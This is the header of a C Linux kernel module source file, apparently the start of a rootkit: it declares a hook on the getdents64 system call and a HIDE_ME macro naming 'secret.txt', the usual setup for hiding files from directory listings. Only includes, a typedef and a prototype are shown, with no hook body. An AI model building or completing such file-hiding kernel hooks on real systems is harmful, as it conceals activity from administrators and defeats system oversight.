#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/version.h>
#include <linux/kallsyms.h>
#include <linux/sched/signal.h>
#include <linux/proc_ns.h>
#include <linux/fs_struct.h>
#include <asm/current.h>
#include <asm/ptrace.h>
#include <linux/sched.h>
#include <linux/security.h>
#include <linux/types.h>
#define HIDE_ME "secret.txt"
typedef asmlinkage unsigned long (*sys_call)(const struct pt_regs *);
asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs);
